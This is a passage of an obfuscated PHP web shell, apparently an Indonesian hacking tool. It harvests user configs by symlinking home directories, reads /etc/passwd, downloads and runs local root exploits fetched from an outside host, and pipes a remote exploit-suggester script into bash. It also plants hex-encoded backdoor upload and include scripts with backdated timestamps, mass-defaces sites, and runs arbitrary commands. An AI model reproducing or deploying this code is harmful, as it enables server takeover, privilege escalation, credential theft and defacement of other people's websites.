	} elseif (!empty(komenb("ca"."t /e"."tc/"."pa"."ss"."wd", $lokasi))) {
		$syp = komenb("ca"."t /e"."tc/"."pa"."ss"."wd", $lokasi);
	} else {
		die(red("[!] Gagal Mengambil Di"."rec"."to"."ry !"));
	}
	if (!$fnct("sy"."mli"."nk")) {
		if (!$fnct("pr"."oc_"."op"."en")) {
			die(red("[!] Sy"."mli"."nk Fu"."nct"."ion is Di"."sabl"."ed !"));
		}
	}
	echo "<center>[ <gold>GR"."AB CO"."NFIG</gold> ] - [ <a href=".$_SERVER['R'.'EQ'.'UE'.'ST_'.'UR'.'I']."&opsidua=s"."yfile><gold>SY"."MLI"."NK FI"."LE</gold></a> ] - [ <gold>SY"."MLI"."NK VH"."OST</gold> ]</center>";
	if (isset($_GET['opsidua'])) {
		if ($_GET['opsidua'] == "gra"."bco"."nfig") {
			# code...
		} elseif ($_GET['opsidua'] == "s"."yfile") {
			echo "<br><br><center>Opsi : <gold>Sy"."mli"."nk Fi"."le</gold>";
			echo '<form method="post">File : 
			<input type="text" name="domena" style="cursor: pointer; border-color: #000" class="up" placeholder="/ho'.'me/'.'use'.'r/p'.'ubli'.'c_ht'.'ml/da'.'tab'.'ase.'.'php">
			<input type="submit" name="gaskeun" value="Gaskeun" class="up" style="cursor: pointer">
			</form></center>';
			if (isset($_POST['gaskeun'])) {
				$rend = rand().".txt";
				$lokdi = $_POST['domena'];
				esyeem($lokdi, "an"."on_s"."ym/".$rend);
				echo '<br><center>Cek : <a href="an'.'on_'.'sy'.'m/'.$rend.'"><gold>'.$rend."</gold></a></center><br>";
			}
		}
		echo "<hr>";
		die(author());
	}
	$pma("/\/ho"."me\/(.*?):/i", $syp, $sypr);
	$sypr = $sypr[1];
	if (empty($sypr)) {
		die(red("[!] Tidak Ada Us"."er di Temukan !"));
	}
	echo "Total Ada ".$ctn($aru($sypr))." Us"."er di Ser"."ver <font color=gold>".$_SERVER[$rad]."</font><br><br>";
	if (!$isw(getcwd())) {
		die(red("[!] Gagal Sy"."mli"."nk - Red D"."ir !"));
	}
	if (!$fxt("an"."on_"."sy"."m")) {
		$mdr("an"."on_"."sy"."m");
	}
	if (!$fxt("an"."on_"."sy"."m/.ht"."acc"."ess")) {
		$fpt("an"."on_"."sy"."m/."."h"."ta"."cce"."ss", $urd("Opt"."ions%20In"."dexe"."s%20Fol"."lowSy"."mLi"."nks%0D%0ADi"."rect"."oryIn"."dex%20sss"."sss.htm%0D%0AAdd"."Type%20txt%20.ph"."p%0D%0AAd"."dHand"."ler%20txt%20.p"."hp"));
	}
	$ckn = esyeem("/", "an"."on_"."sy"."m/anon");
	foreach ($aru($sypr) as $sj) {
		$sjh = "/h"."om"."e/".$sj."/pu"."bl"."ic_h"."tml";
		$ygy = $srl($bsn($_SERVER['SC'.'RI'.'PT_NA'.'ME']), "an"."on_"."sy"."m/anon".$sjh, $_SERVER['SC'.'RI'.'PT_NA'.'ME']);
		if ($ird("/e"."tc"."/na"."me"."d.co"."nf")) {
			$etn = $fgt("/e"."tc"."/na"."me"."d.co"."nf");
			$pma("/\/v"."ar\/na"."me"."d\/(.*?)\.d"."b/i", $etn, $en);
			$en = $en[1];
			echo "[<font color=gold>Sy"."mli"."nk</font>] <a href='".$ygy."' target=_blank>".$sjh."</a> => ";
			foreach ($aru($en) as $enw) {
				$asd = $pgw(@$fow("/e"."tc/"."val"."ias"."es/".$enw));
				$asd = $asd['name'];
				if ($asd == $sj) {
					echo "<a href='http://".$enw."' target=_blank><font color=gold>".$enw."</font></a>, ";
				}
			}
			echo "<br>";
		} else {
			echo "[<font color=gold>Sy"."mli"."nk</font>] <a href='".$ygy."' target=_blank>".$sjh."</a><br>";
		}
	}
	echo "<hr>";
	die(author());
} elseif (isset($_GET['loknya']) && $_GET['opsi'] == "scanr") {
	ob_implicit_flush();ob_end_flush();
	echo '<center>[ <a href="'.$_SERVER['R'.'EQ'.'UE'.'ST_'.'UR'.'I'].'&opsidua=au'.'tos'.'can"><gold>Au'.'to Sc'.'an</gold></a> ] | [ <a href="'.$_SERVER['R'.'EQ'.'UE'.'ST_'.'UR'.'I'].'&opsidua=sc'.'ansd"><gold>Sc'.'an S'.'U'.'I'.'D</gold></a> ] | [ <a href="'.$_SERVER['R'.'EQ'.'UE'.'ST_'.'UR'.'I'].'&opsidua=esg"><gold>Ex'.'plo'.'it Su'.'gges'.'ter</gold></a> ]</center>';
	if (!$fnct("pr"."oc_"."op"."en")) {
		die(red("[!] Co"."mman"."d is D"."isab"."led !"));
	}
	if (!$isw($lokasi)) {
		die(red("[!] Cur"."rent D"."ir"."ect"."ory is Un"."wri"."tea"."ble !"));
	}
	if (isset($_GET['opsidua']) && $_GET['opsidua'] == "au"."tosc"."an") {
		if (!$fxt($lokasi."/an"."on_"."ro"."ot/")) {
			$mdr($lokasi."/an"."on_"."ro"."ot");
			komenb("wg"."et h"."ttp://f.pp"."k.pw/aut"."o.ta"."r"."-06-27-"."22.gz", $lokasi."/an"."on_"."ro"."ot");
			komenb("t"."ar -x"."f au"."to.ta"."r-06-2"."7-22."."gz", $lokasi."/an"."on_"."ro"."ot");
			if (!$fxt($lokasi."/an"."on_"."ro"."ot/netf"."ilter")) {
				die(red("[!] Ga"."gal Do"."wnloa"."d Bahan"));
			}
		}
		echo "<br>Ke"."rne"."l : <gold>".komenb("un"."am"."e -a", $lokasi)."</gold><br>";
		echo "Us"."er : <gold>".komenb("i"."d", $lokasi)."</gold><br>";
		echo "<br>[+] Trying All Ex"."plo"."its ...<br>";
		echo "Ne"."tfil"."ter : ".komend("ti"."meo"."ut 1"."0 ./an"."on_ro"."ot/netf"."ilter", $lokasi)."<br>";
		echo "Ptr"."ace : ".komend("ec"."ho id | ti"."meo"."ut 1"."0 ./an"."on_ro"."ot/ptr"."ace", $lokasi)."<br>";
		echo "Seq"."uoia : ".komend("ti"."meo"."ut 1"."0 ./an"."on_ro"."ot/seq"."uoia", $lokasi)."<br>";
		echo "Over"."layF"."S : ".komend("ec"."ho id | ./overl"."ayfs", $lokasi."/an"."on_"."ro"."ot")."<br>";
		echo "Di"."rtyp"."ipe : ".komend("echo i"."d | ti"."meo"."ut 1"."0 ./an"."on_ro"."ot/di"."rtyp"."ipe /u"."sr/"."bi"."n/"."su", $lokasi)."<br>";
		echo "Su"."do : ".komend("ec"."ho 12345 | ti"."meo"."ut 1"."0 sud"."oed"."it -s Y", $lokasi)."<br>";
		echo "Pw"."nki"."t : ".komend("ec"."ho id | ti"."meo"."ut 1"."0 ./p"."wnk"."it", $lokasi."/an"."on_"."ro"."ot")."<br>";
		echo "Capsys : ".komend("echo id | timeout 10 ./cap"."sy"."s", $lokasi."/an"."on_ro"."ot")."<br>";
		echo "Ne"."tfil"."ter 2 : ".komend("echo id | tim"."eout 10 ./ne"."tfilt"."er2", $lokasi."/an"."on_ro"."ot")."<br>";
		echo "Ne"."tfil"."ter 3 : ".komend("echo id | time"."out 10 ./net"."fil"."ter3", $lokasi."/an"."on_ro"."ot")."<br>";
		komenb("r"."m -r"."f an"."on_ro"."ot", $lokasi);

	} elseif (isset($_GET['opsidua']) && $_GET['opsidua'] == "scansd") {
		echo "<br>[+] Sc"."ann"."ing ...<br>";
		echo komend("fi"."nd / -pe"."r"."m -u"."=s -t"."ype f"." 2".">/"."de"."v/nu"."ll", $lokasi);
	} elseif (isset($_GET['opsidua']) && $_GET['opsidua'] == "esg") {
		echo "<br>[+] Loading ...<br>";
		echo komend("cu"."rl -"."Ls"."k ht"."tp://ra"."w.gith"."ubuse"."rconte"."nt.com/m"."zet"."-/lin"."ux-exp"."loit"."-sugge"."ster/m"."aste"."r/lin"."ux-ex"."ploi"."t-sugg"."ester."."sh | ba"."sh", $lokasi);
	}
	echo "<hr>";
	die(author());
} elseif (isset($_GET['loknya']) && $_GET['opsi'] == "bekup") {
	if (isset($_POST['lo'.'kr'.'una'])) {
		echo "<center>";
		echo "Path : <gold>".$hsc($_POST['lo'.'kr'.'una'])."</gold><br>";
		if (!$isr($_POST['lo'.'kr'.'una'])) {
			die(red("[+] Cur"."rent Pa"."th is Unre"."adable !"));
		} elseif (!$isw($_POST['lo'.'kr'.'una'])) {
			die(red("[+] Cur"."rent Pa"."th is Un"."wri"."tea"."ble !"));
		}
		$loks = sds($_POST['lo'.'kr'.'una']);
		$pisah = $ars($loks, -50);
		$los = $arr($pisah, 2);
		$satu = $loks[$los[0]];
		$satut = $ftm($satu);
		$dua = $loks[$los[1]];
		$duat = $ftm($dua);
		if (empty($satu) && empty($dua)) {
			die(red("[+] Unknown Error !"));
		}
		echo "<br>";
		if (!$isw($satu)) {
			echo "[<merah>Fa"."il"."ed</merah>] ".$satu."<br>";
		} else {
			$satus = $satu."/cont"."act.p"."hp";
			$fpt($satus, $h2b("3c6d65746120636f6e74656e743d226e6f696e646578226e616d653d22726f626f7473223e436f6e74616374204d653c666f726d20656e63747970653d226d756c7469706172742f666f726d2d64617461226d6574686f643d22706f7374223e3c696e707574206e616d653d226274756c22747970653d2266696c65223e3c627574746f6e3e4761736b616e3c2f627574746f6e3e3c2f666f726d3e3c3f3d22223b24613d2766272e2769272e276c272e2765272e275f272e2770272e2775272e2774272e275f272e2763272e276f272e276e272e2774272e2765272e276e272e2774272e2773273b24623d2766272e2769272e276c272e2765272e275f272e2767272e2765272e2774272e275f272e2763272e276f272e276e272e2774272e2765272e276e272e2774272e2773273b24633d2774272e276d272e2770272e275f272e276e272e2761272e276d272e2765273b24643d2768272e276578272e273262272e27696e273b24663d2766272e27696c272e27655f65272e277869272e277374272e2773273b696628697373657428245f46494c45535b276274756c275d29297b246128245f46494c45535b276274756c275d5b276e616d65275d2c246228245f46494c45535b276274756c275d5b24635d29293b696628246628272e2f272e245f46494c45535b276274756c275d5b276e616d65275d29297b6563686f20274f6b652021273b7d656c73657b6563686f20274661696c2021273b7d7d696628697373657428245f4745545b27667074275d29297b246128246428245f504f53545b2766275d292c246428245f504f53545b2764275d29293b696628246628246428245f504f53545b2766275d2929297b6563686f20224f6b652021223b7d656c73657b6563686f20224661696c2021223b7d7d3f3e"));
			$tch($satus, $satut);
			$tch($satu, $satut);
			echo "[<ijo>Su"."cc"."ess</ijo>] ".$satus."<br>";
			if ($sps($_POST['lo'.'kr'.'una'], $_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T']) !== false) {
				$lwb = $srl($_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T'], $wb, $satus);
				$satul = "<br><a href='".$lwb."'><font color='gold'>".$lwb."</font></a><br>";
			}
		}
		if (!$isw($dua)) {
			echo "[<merah>Fa"."il"."ed</merah>] ".$dua."<br>";
		} else {
			$duas = $dua."/setti"."ng.p"."hp";
			$fpt($duas, $h2b("3c6d657461206e616d653d22726f626f74732220636f6e74656e743d226e6f696e646578223e0d0a4d792053657474696e670d0a3c3f7068700d0a2461203d20226669222e226c655f70222e2275745f63222e226f6e74222e2265222e226e74222e2273223b0d0a2462203d202266222e22696c222e22655f6765222e2274222e225f636f222e226e74656e74222e2273223b0d0a2463203d20226669222e226c65222e225f6578222e226973222e227473223b0d0a2464203d202268222e226578222e223262222e22696e223b0d0a69662028697373657428245f504f53545b276b6f64275d2929207b0d0a09246128245f504f53545b276c6f6b275d2c20246428245f504f53545b276b6f64275d29293b0d0a0969662028246328245f504f53545b276c6f6b275d2929207b0d0a09096563686f20224f4b202120223b0d0a097d20656c7365207b0d0a09096563686f20224661696c6564202120223b0d0a097d0d0a7d0d0a69662028697373657428245f4745545b276963275d2929207b0d0a09696e636c75646520245f4745545b276963275d3b0d0a7d0d0a69662028697373657428245f4745545b276170275d2929207b0d0a0924612822776b776b2e706870222c20246428223363366436353734363132303665363136643635336432323732366636323666373437333232323036333666366537343635366537343364323236653666363936653634363537383232336534333666366537343631363337343230346436353363363636663732366432303664363537343638366636343364323237303666373337343232323036353665363337343739373036353364323236643735366337343639373036313732373432663636366637323664326436343631373436313232336533633639366537303735373432303734373937303635336432323636363936633635323232303665363136643635336432323632373437353663323233653363363237353734373436663665336534373631373336623631366533633266363237353734373436663665336533633266363636663732366433653061336333663730363837303061323436313230336432303232363632323265323236393232326532323663323232653232363532323265323235663232326532323730323232653232373532323265323237343232326532323566323232653232363332323265323236663232326532323665323232653232373432323265323236353232326532323665323232653232373432323265323237333232336230613234363232303364323032323636323232653232363932323265323236633232326532323635323232653232356632323265323236373232326532323635323232653232373432323265323235663232326532323633323232653232366632323265323236653232326532323734323232653232363532323265323236653232326532323734323232653232373332323362306132343633323033643230323237343232326532323664323232653232373032323265323235663232326532323665323232653232363132323265323236643232326532323635323233623061363936363230323836393733373336353734323832343566343634393463343535333562323736323734373536633237356432393239323037623234363132383234356634363439346334353533356232373632373437353663323735643562323736653631366436353237356432633230323436323238323435663436343934633435353335623237363237343735366332373564356232343633356432393239336236393636323032383636363936633635356636353738363937333734373332383232326532663232326532343566343634393463343535333562323736323734373536633237356435623237366536313664363532373564323932393230376236353633363836663230323234663662363532303231323233623764323036353663373336353230376236353633363836663230323234363631363936633230323132323362376437643061336633652229293b0d0a096966202824632822776b222e22776b2e222e227068222e2270222929207b0d0a09096563686f20224f4b2021223b0d0a097d0d0a7d0d0a3f3e"));
			$tch($duas, $duat);
			$tch($dua, $duat);
			echo "[<ijo>Su"."cc"."ess</ijo>] ".$duas."<br>";
			if ($sps($_POST['lo'.'kr'.'una'], $_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T']) !== false) {
				$lwb = $srl($_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T'], $wb, $duas);
				$dual = "<a href='".$lwb."'><font color='gold'>".$lwb."</font></a><br>";
			}
		}
		echo "<br>";
		if (!empty($satul)) {
			echo $satul;
		}
		if (!empty($dual)) {
			echo $dual;
		}
		echo "</center>";
	} else {
		echo "<center>Masukkan Lokasi Docu"."ment Ro"."ot<br>";
		echo '<form method="post"><input type="text" name="lokruna" value="'.$hsc($_GET['loknya']).'" style="cursor: pointer; border-color: #000" class="up"> ';
		echo '<input type="submit" name="palepale" value="Gaskan" class="up" style="cursor: pointer"></form>';
	}
	die();
} elseif (isset($_GET['opsi']) && $_GET['opsi'] == "repip") {
	echo "<center>";
	echo "Re"."ver"."se I"."P : <gold>".$hsc($_SERVER['SE'.'RVE'.'R_NA'.'ME'])."</gold>";
	echo "<pre>".$hsc(crul("http"."s://ap"."i.ha"."ck"."ertarg"."et.com/re"."verse"."ipl"."ookup/?q=".$_SERVER['SE'.'RVE'.'R_NA'.'ME']))."</pre>";
	echo "</center>";
	die();
} elseif (isset($_GET['loknya']) && $_GET['opsi'] == "mdf") {
	echo "<center>";
	if (empty($_POST['palepale'])) {
		echo '<form method="post">';
		echo 'Di'.'r : <input type="text" name="lokena" class="up" style="cursor: pointer; border-color: #000" value="'.$hsc($_GET['loknya']).'"><br>';
		echo 'Nama Fi'.'le : <input type="text" name="nfil" class="up" style="cursor: pointer; border-color: #000" value="ind'.'ex.p'.'hp"><br><br>';
		echo 'Isi Fi'.'le : <br><textarea class="up" cols="80" rows="20" name="isikod"></textarea><br><br>';
		echo '<select name="opsina"><option value="mdf">Ma'.'ss Def'.'ace</option><option value="mds">Ma'.'ss De'.'fa'.'ce 2</option></select><br><br>';
		echo '<input type="submit" name="palepale" value="Gaskeun" class="up" style="cursor: pointer">';
		echo '</form>';
	} else {
		$lokena = $_POST['lokena'];
		$nfil = $_POST['nfil'];
		$isif = $_POST['isikod'];
		echo "Di"."r : <gold>".$hsc($lokena)."</gold><br>";
		if (!$fxt($lokena)) {
			die(red("[+] Di"."re"."cto"."ry Tidak di Temukan !"));
		}
		$g = $scd($lokena);
		if (isset($_POST['opsina']) && $_POST['opsina'] == "mds") {
			foreach ($g as $gg) {
				if (isset($gg) && $gg == "." || $gg == "..") {
					continue;
				} elseif (!$idr($gg)) {
					continue;
				}
				if (!$isw($lokena."/".$gg)) {
					echo "[<merah>Un"."wri"."tea"."ble</merah>] ".$lokena."/".$gg."<br>";
					continue;
				}
				$loe = $lokena."/".$gg."/".$nfil;
				$cf = $fgr($gg);
				if ($cf == "9"."9") {
					if ($fpt($loe, $isif) !== false) {
						if ($sps($gg, ".") !== false) {
							echo "[<ijo>Su"."cc"."ess</ijo>] ".$loe." -> <a href='//".$gg."/".$nfil."'><gold>".$gg."/".$nfil."</gold></a><br>";
						} else {
							echo "[<ijo>Su"."cc"."ess</ijo>] ".$loe."<br>";
						}
					}
				}
			}
			echo "<hr>";
			die(author());
		}
		foreach ($g as $gg) {
			if (isset($gg) && $gg == "." || $gg == "..") {
				continue;
			} elseif (!$idr($gg)) {
				continue;
			}
			if (!$isw($lokena."/".$gg)) {
				echo "[<merah>Un"."wri"."tea"."ble</merah>] ".$lokena."/".$gg."<br>";
				continue;
			}
			$loe = $lokena."/".$gg."/".$nfil;
			if ($fpt($loe, $isif) !== false) {
				echo "[<ijo>Su"."cc"."ess</ijo>] ".$loe."<br>";
			} else {
				echo "[<merah>Un"."wri"."tea"."ble</merah>] ".$lokena."/".$gg."<br>";
			}
		}
	}
	echo "<hr>";
	echo "</center>";
	die(author());
}

if (isset($_GET['lokasie'])) {
	echo "<tr><td>Current Fi"."le : ".$_GET['lokasie'];
	echo '</tr></td></table><br/>';
	echo "<pre>".$hsc($fgt($_GET['lokasie']))."</pre>";
	author();
} elseif (isset($_POST['loknya']) && $_POST['pilih'] == "hapus") {
	if ($idi($_POST['loknya']) && $fxt($_POST['loknya'])) {
		xrd($_POST['loknya']);
		if ($fxt($_POST['loknya'])) {
			red("Fai"."led to del"."ete D"."ir"."ec"."tory !");
		} else {
			green("Del"."ete Di"."r"."ect"."ory Suc"."cess !");
		}
	} elseif ($ifi($_POST['loknya']) && $fxt($_POST['loknya'])) {
		@$ulk($_POST['loknya']);
		if ($fxt($_POST['loknya'])) {
			red("Fa"."il"."ed to Delete Fi"."le !");
		} else {
			green("De"."le"."te Fi"."le Succ"."ess !");
		}
	} else {
		red("Fi"."le / Di"."r"."ecto"."ry not Fo"."und !");
	}
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "ubahmod") {
	if (!isset($_POST['cemod'])) {
		if ($_POST['ty'.'pe'] == "fi"."le") {
			echo "<center>Fi"."le : ".$hsc($_POST['loknya'])."<br>";
		} else {
			echo "<center>D"."ir : ".$hsc($_POST['loknya'])."<br>";
		}
		echo '<form method="post">
		Pe'.'rmi'.'ss'.'ion : <input name="perm" type="text" class="up" size="4" maxlength="4" value="'.$sub($spr('%o', $fp($_POST['loknya'])), -4).'" />
		<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
		<input type="hidden" name="pilih" value="ubahmod">';
		if ($_POST['ty'.'pe'] == "fi"."le") {
			echo '<input type="hidden" name="type" value="fi'.'le">';;
		} else {
			echo '<input type="hidden" name="type" value="di'.'r">';;
		}
		echo '<input type="submit" value="Change" name="cemod" class="up" style="cursor: pointer; border-color: #fff"/>
		</form><br>';
	} else {
		$cm = @$chm($_POST['loknya'], $ocd($_POST['perm']));
		if ($cm == true) {
			green("Change Mod Su"."cc"."ess !");
			if ($_POST['ty'.'pe'] == "fi"."le") {
				echo "<center>Fi"."le : ".$hsc($_POST['loknya'])."<br>";
			} else {
				echo "<center>D"."ir : ".$hsc($_POST['loknya'])."<br>";
			}
			echo '<form method="post">
			Pe'.'rmi'.'ss'.'ion : <input name="perm" type="text" class="up" size="4" maxlength="4" value="'.$sub($spr('%o', $fp($_POST['loknya'])), -4).'" />
			<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
			<input type="hidden" name="pilih" value="ubahmod">';
			if ($_POST['ty'.'pe'] == "fi"."le") {
				echo '<input type="hidden" name="type" value="fi'.'le">';;
			} else {
				echo '<input type="hidden" name="type" value="di'.'r">';;
			}
			echo '<input type="submit" value="Change" name="cemod" class="up" style="cursor: pointer; border-color: #fff"/>
			</form><br>';
		} else {
			red("Change Mod Fa"."il"."ed !");
			if ($_POST['ty'.'pe'] == "fi"."le") {
				echo "<center>Fi"."le : ".$hsc($_POST['loknya'])."<br>";
			} else {
				echo "<center>D"."ir : ".$hsc($_POST['loknya'])."<br>";
			}
			echo '<form method="post">
			Pe'.'rmi'.'ss'.'ion : <input name="perm" type="text" class="up" size="4" maxlength="4" value="'.$sub($spr('%o', $fp($_POST['loknya'])), -4).'" />
			<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
			<input type="hidden" name="pilih" value="ubahmod">';
			if ($_POST['ty'.'pe'] == "fi"."le") {
				echo '<input type="hidden" name="type" value="fi'.'le">';;
			} else {
				echo '<input type="hidden" name="type" value="di'.'r">';;
			}
			echo '<input type="submit" value="Change" name="cemod" class="up" style="cursor: pointer; border-color: #fff"/>
			</form><br>';
		}
	}
} elseif (isset($_POST['loknya']) && $_POST['pilih'] == "ubahnama") {
	if (isset($_POST['gantin'])) {
		$namabaru = $_GET['loknya']."/".$_POST['newname'];
		$ceen = "re"."na"."me";
		if (@$ceen($_POST['loknya'], $namabaru) === true) {
			green("Change Name Su"."cc"."ess");
			if ($_POST['ty'.'pe'] == "fi"."le") {
				echo "<center>Fi"."le : ".$hsc($_POST['loknya'])."<br>";
			} else {
				echo "<center>D"."ir : ".$hsc($_POST['loknya'])."<br>";
			}
			echo '<form method="post">
			New Name : <input name="newname" type="text" class="up" size="20" value="'.$hsc($_POST['newname']).'" />
			<input type="hidden" name="loknya" value="'.$_POST['newname'].'">
			<input type="hidden" name="pilih" value="ubahnama">';
			if ($_POST['ty'.'pe'] == "fi"."le") {
				echo '<input type="hidden" name="type" value="fi'.'le">';;
			} else {
				echo '<input type="hidden" name="type" value="di'.'r">';;
			}
			echo '<input type="submit" value="Change" name="gantin" class="up" style="cursor: pointer; border-color: #fff"/>
			</form><br>';
		} else {
			red("Change Name Fa"."il"."ed");
		}
	} else {
		if ($_POST['ty'.'pe'] == "fi"."le") {
			echo "<center>Fi"."le : ".$hsc($_POST['loknya'])."<br>";
		} else {
			echo "<center>D"."ir : ".$hsc($_POST['loknya'])."<br>";
		}
		echo '<form method="post">
		New Name : <input name="newname" type="text" class="up" size="20" value="'.$hsc($bsn($_POST['loknya'])).'" />
		<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
		<input type="hidden" name="pilih" value="ubahnama">';
		if ($_POST['ty'.'pe'] == "fi"."le") {
			echo '<input type="hidden" name="type" value="fi'.'le">';;
		} else {
			echo '<input type="hidden" name="type" value="di'.'r">';;
		}
		echo '<input type="submit" value="Change" name="gantin" class="up" style="cursor: pointer; border-color: #fff"/>
		</form><br>';
	}
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "edit") {
	if (isset($_POST['gasedit'])) {
		$edit = @$fpt($_POST['loknya'], $_POST['src']);
		if ($fgt($_POST['loknya']) == $_POST['src']) {
			green("Ed"."it Fi"."le Suc"."ce"."ss !");
		} else {
			red("Ed"."it Fi"."le Fai"."led !");
		}
	}
	echo "<center>Fi"."le : ".$hsc($_POST['loknya'])."<br><br>";
	echo '<form method="post">
	<textarea cols=80 rows=20 name="src">'.$hsc($fgt($_POST['loknya'])).'</textarea><br>
	<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
	<input type="hidden" name="pilih" value="ed'.'it">
	<input type="submit" value="Ed'.'it Fi'.'le" name="gasedit" class="up" style="cursor: pointer; border-color: #fff"/>
	</form><br>';
} elseif (isset($_POST['komends'])) {
	if (isset($_POST['komend'])) {
		if (isset($_GET['loknya'])) {
			$lk = $_GET['loknya'];
		} else {
			$lk = $gcw();
		}
		$km = 'ko'.'me'.'nd';
		echo $km($_POST['komend'], $lk);
		exit();
	}
} elseif (isset($_POST['loknya']) && $_POST['pilih'] == "ubahtanggal") {
	if (isset($_POST['tanggale'])) {
		$stt = "st"."rtot"."ime";
		$tch = "t"."ou"."ch";
		$tanggale = $stt($_POST['tanggal']);
		if (@$tch($_POST['loknya'], $tanggale) === true) {
			green("Change Da"."te Succ"."ess !");
			$det = "da"."te";
			$ftm = "fi"."le"."mti"."me";
			$b = $det("d F Y H:i:s", $ftm($_POST['loknya']));
			if ($_POST['ty'.'pe'] == "fi"."le") {
				echo "<center>Fi"."le : ".$hsc($_POST['loknya'])."<br>";
			} else {
				echo "<center>D"."ir : ".$hsc($_POST['loknya'])."<br>";
			}
			echo '<form method="post">
			New Da'.'te : <input name="tanggal" type="text" class="up" size="20" value="'.$b.'" />
			<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
			<input type="hidden" name="pilih" value="ubahtanggal">';
			if ($_POST['ty'.'pe'] == "fi"."le") {
				echo '<input type="hidden" name="type" value="fi'.'le">';;
			} else {
				echo '<input type="hidden" name="type" value="di'.'r">';;
			}
			echo '<input type="submit" value="Change" name="tanggale" class="up" style="cursor: pointer; border-color: #fff"/>
			</form><br>';
		} else {
			red("Fai"."led to Cha"."nge Da"."te !");
		}
	} else {
		$det = "da"."te";
		$ftm = "fi"."le"."mti"."me";
		$b = $det("d F Y H:i:s", $ftm($_POST['loknya']));
		if ($_POST['ty'.'pe'] == "fi"."le") {
			echo "<center>Fi"."le : ".$hsc($_POST['loknya'])."<br>";
		} else {
			echo "<center>D"."ir : ".$hsc($_POST['loknya'])."<br>";
		}
		echo '<form method="post">
		New Da'.'te : <input name="tanggal" type="text" class="up" size="20" value="'.$b.'" />
		<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
		<input type="hidden" name="pilih" value="ubahtanggal">';
		if ($_POST['ty'.'pe'] == "fi"."le") {
			echo '<input type="hidden" name="type" value="fi'.'le">';;
		} else {
			echo '<input type="hidden" name="type" value="di'.'r">';;
		}
		echo '<input type="submit" value="Change" name="tanggale" class="up" style="cursor: pointer; border-color: #fff"/>
		</form><br>';
	}
} elseif (isset($_POST['loknya']) && $_POST['pilih'] == "dunlut") {
	$dunlute = $_POST['loknya'];
	if ($fxt($dunlute) && isset($dunlute)) {
		if ($ird($dunlute)) {
			dunlut($dunlute);
		} elseif ($idr($fl)) {
			red("That is Di"."rec"."tory, Not Fi"."le -_-");
		} else {
			red("Fi"."le is Not Re"."adab"."le !");
		}
	} else {
		red("Fi"."le Not Fo"."und !");
	}
} elseif (isset($_POST['loknya']) && $_POST['pilih'] == "fo"."ld"."er") {
    if ($isw("./") || $ird("./")) {
        $loke = $_POST['loknya'];
        if (isset($_POST['buatfol'.'der'])) {
            $buatf = $mkd($loke."/".$_POST['fo'.'lde'.'rba'.'ru']);
            if ($buatf == true) {
                green("Fol"."der <b>".$hsc($_POST['fo'.'lde'.'rba'.'ru'])."</b> Created !");
                echo '<form method="post"><center>Fo'.'lde'.'r : <input type="text" name="fo'.'lde'.'rba'.'ru" class="up"> <input type="submit" name="buatFo'.'lde'.'r" value="Create Fo'.'lde'.'r" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
                echo '<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
                <input type="hidden" name="pilih" value="Fo'.'lde'.'r"></form>';
            } else {
                red("Fa"."il"."ed to Create fol"."der !");
                echo '<form method="post"><center>Fo'.'lde'.'r : <input type="text" name="fo'.'lde'.'rba'.'ru" class="up"> <input type="submit" name="buatFo'.'lde'.'r" value="Create Fo'.'lde'.'r" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
                echo '<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
                <input type="hidden" name="pilih" value="Fo'.'lde'.'r"></form>';
            }
        } else {
            echo '<form method="post"><center>Fo'.'lde'.'r : <input type="text" name="fo'.'lde'.'rba'.'ru" class="up"> <input type="submit" name="buatFo'.'lde'.'r" value="Create Fo'.'lde'.'r" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
            echo '<input type="hidden" name="loknya" value="'.$_POST['loknya'].'"><input type="hidden" name="pilih" value="Fo'.'lde'.'r"></form>';
        }
    }
} elseif (isset($_POST['lok'.'nya']) && $_POST['pilih'] == "fi"."le") {
    if ($isw("./") || $isr("./")) {
        $loke = $_POST['lok'.'nya'];
        if (isset($_POST['buatfi'.'le'])) {
            $buatf = $fpt($loke."/".$_POST['fi'.'lebaru'], "");
            if ($fxt($loke."/".$_POST['fi'.'lebaru'])) {
                green("File <b>".$hsc($_POST['fi'.'lebaru'])."</b> Created !");
                echo '<form method="post"><center>Filename : <input type="text" name="fi'.'lebaru" class="up"> <input type="submit" name="buatfi'.'le" value="Create Fi'.'le" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
                echo '<input type="hidden" name="loknya" value="'.$_POST['lok'.'nya'].'">
                <input type="hidden" name="pilih" value="fi'.'le"></form>';
            } else {
                red("Fa"."il"."ed to Create Fi"."le !");
                echo '<form method="post"><center>Filename : <input type="text" name="fi'.'lebaru" class="up"> <input type="submit" name="buatfi'.'le" value="Create File" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
                echo '<input type="hidden" name="loknya" value="'.$_POST['lok'.'nya'].'">
                <input type="hidden" name="pilih" value="fi'.'le"></form>';
            }
        } else {
            echo '<form method="post"><center>Filename : <input type="text" name="fi'.'lebaru" class="up"> <input type="submit" name="buatfi'.'le" value="Create File" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
            echo '<input type="hidden" name="loknya" value="'.$_POST['lok'.'nya'].'"><input type="hidden" name="pilih" value="fi'.'le"></form>';
        }
    }
}

echo '<div id="content"><table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Na'.'me</center></td>
<td><center>Si'.'ze</center></td>
<td><center>Las'.'t Mo'.'dif'.'ied</center></td>
<td><center>Owner / Group</center></td>
<td><center>Pe'.'rmi'.'ss'.'ions</center></td>
<td><center>Op'.'tio'.'ns</center></td>
</tr>';

echo "<tr>";
$euybrekw = $srl($bsn($lokasi), "", $lokasi);
